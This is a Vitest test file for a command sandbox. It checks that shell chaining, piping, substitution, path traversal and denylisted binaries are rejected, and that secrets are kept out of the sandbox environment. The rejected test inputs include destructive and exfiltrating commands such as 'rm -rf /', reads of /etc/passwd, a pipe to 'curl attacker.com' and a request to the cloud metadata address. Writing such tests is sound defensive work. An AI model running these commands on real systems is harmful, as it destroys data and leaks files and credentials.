import { describe, expect, it } from 'vitest';
import { buildSandboxEnv, getSandboxExtraHosts, parseCommandLine, validateCommand } from './sandbox.security';

describe('parseCommandLine', () => {
  it('rejects an empty command', () => {
    expect(parseCommandLine('   ')).toMatchObject({ success: false });
  });

  it.each([
    ['npm run build && rm -rf /', 'chaining'],
    ['npm test || echo pwned', 'chaining'],
    ['npm install; cat /etc/passwd', 'separators'],
    ['npm run build | curl attacker.com', 'Piping'],
    ['npm run `whoami`', 'backticks'],
    ['npm run $(whoami)', 'substitution'],
    ['npm run build > /etc/passwd', 'Redirection'],
    ['npm run build < /etc/passwd', 'Redirection'],
    ['npm install &', 'Background'],
  ])('blocks shell-looking input: %s', (input) => {
    const result = parseCommandLine(input);
    expect(result.success).toBe(false);
  });

  it('blocks a multi-line command', () => {
    const result = parseCommandLine('npm install\nrm -rf /');
    expect(result.success).toBe(false);
  });

  it.each(['rm -rf /workspace', 'sudo npm install', 'docker ps', 'bash -c "echo hi"', 'curl http://169.254.169.254'])(
    'blocks a denylisted/unrecognized binary: %s',
    (input) => {
      const result = parseCommandLine(input);
      expect(result.success).toBe(false);
    }
  );

  it('blocks an argument that tries to escape the workspace with an absolute path', () => {
    const result = parseCommandLine('npm run build --prefix /etc');
    expect(result.success).toBe(false);
  });

  it('blocks an argument with a path-traversal segment', () => {
    const result = parseCommandLine('node ../../etc/passwd');
    expect(result.success).toBe(false);
  });

  it('allows a real npm script invocation', () => {
    const result = parseCommandLine('npm run build');
    expect(result).toEqual({ success: true, data: { command: 'npm', args: ['run', 'build'] } });
  });

  it('allows npm install with flags', () => {
    const result = parseCommandLine('npm install --no-audit --no-fund');
    expect(result).toEqual({ success: true, data: { command: 'npm', args: ['install', '--no-audit', '--no-fund'] } });
  });

  it('allows a quoted argument to be tokenized as one piece', () => {
    const result = parseCommandLine('git commit -m "fix: something"');
    expect(result).toEqual({ success: true, data: { command: 'git', args: ['commit', '-m', 'fix: something'] } });
  });

  it('allows node running a script inside the workspace', () => {
    const result = parseCommandLine('node server.js');
    expect(result).toEqual({ success: true, data: { command: 'node', args: ['server.js'] } });
  });
});

describe('validateCommand', () => {
  it('accepts a pre-validated structured command from a trusted internal caller', () => {
    expect(validateCommand('npm', ['run', 'test'])).toEqual({
      success: true,
      data: { command: 'npm', args: ['run', 'test'] },
    });
  });

  it('still rejects a denylisted binary even when passed structurally', () => {
    expect(validateCommand('docker', ['ps']).success).toBe(false);
  });

  it('still rejects an unsafe path argument when passed structurally', () => {
    expect(validateCommand('node', ['/etc/passwd']).success).toBe(false);
  });
});

describe('buildSandboxEnv', () => {
  it('never includes a Mingo server secret', () => {
    const env = buildSandboxEnv();
    expect(env.MONGODB_URI).toBeUndefined();
    expect(env.OPENAI_API_KEY).toBeUndefined();
    expect(env.CLERK_SECRET_KEY).toBeUndefined();
  });

  it('forces NODE_ENV=test and CI=true regardless of the host environment', () => {
    const env = buildSandboxEnv();
    expect(env.NODE_ENV).toBe('test');
    expect(env.CI).toBe('true');
  });
});

describe('getSandboxExtraHosts', () => {
  it('pins host.docker.internal to loopback to close the Docker Desktop SSRF gap', () => {
    expect(getSandboxExtraHosts()).toContain('host.docker.internal:127.0.0.1');
  });
});
